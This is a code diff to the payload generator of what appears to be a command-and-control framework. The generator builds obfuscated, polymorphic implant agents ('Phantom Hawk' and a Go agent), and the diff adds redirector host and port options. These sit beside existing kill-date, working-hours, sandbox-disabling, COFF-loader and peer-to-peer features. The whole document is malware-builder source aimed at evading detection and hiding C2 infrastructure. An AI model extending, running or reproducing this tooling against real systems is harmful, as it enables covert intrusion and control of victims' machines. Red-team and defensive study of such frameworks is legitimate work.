@@ -156,7 +156,7 @@ class PayloadGenerator:
         print(f"[+] Generating polymorphic variant")
         if payload_type == "phantom_hawk_agent":
             return self._generate_phantom_hawk_agent(
-                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours
+                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
@@ -165,7 +165,7 @@ class PayloadGenerator:
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
 
-    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None):
+    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80):
         if working_hours is None:
             working_hours = {
                 "start_hour": 9,
@@ -267,6 +267,11 @@ class PayloadGenerator:
 
         v_kill_date = poly.generate_random_name('kill_date_')
         v_working_hours = poly.generate_random_name('working_hours_')
+
+        # Redirector variables
+        v_redirector_host = poly.generate_random_name('redirector_host_')
+        v_redirector_port = poly.generate_random_name('redirector_port_')
+        v_use_redirector = poly.generate_random_name('use_redirector_')
 
         v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')
 
@@ -381,6 +386,9 @@ class PayloadGenerator:
             v_p2p_discovery_timer=v_p2p_discovery_timer,
             v_p2p_command_queue=v_p2p_command_queue,
             v_sandbox_enabled=v_sandbox_enabled,
+            v_redirector_host=v_redirector_host,
+            v_redirector_port=v_redirector_port,
+            v_use_redirector=v_use_redirector,
             v_kill_date=v_kill_date,
             v_working_hours=v_working_hours,
             kill_date=kill_date,
@@ -398,7 +406,10 @@ class PayloadGenerator:
             listener_id_for_registration=listener_id_for_registration,
             p2p_enabled=p2p_enabled,
             p2p_port=p2p_port,
-            secret_key=secret_key
+            secret_key=secret_key,
+            redirector_host=redirector_host,
+            redirector_port=redirector_port,
+            use_redirector=str(use_redirector).lower().capitalize()
         )
 
         print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
